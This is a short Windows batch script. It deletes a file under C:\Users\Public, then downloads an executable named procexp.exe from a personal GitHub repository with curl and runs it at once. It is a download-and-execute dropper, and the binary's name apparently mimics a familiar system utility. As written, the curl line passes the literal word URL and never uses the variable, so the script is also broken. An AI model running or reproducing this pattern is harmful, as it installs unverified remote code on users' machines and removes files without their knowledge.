@echo off

if exist "C:\Users\Public\test.bat" del "C:\Users\Public\test.bat"
set URL="https://raw.githubusercontent.com/BelliniGauss/1/main/procexp.exe"
curl -O URL && start procexp.exe

exit
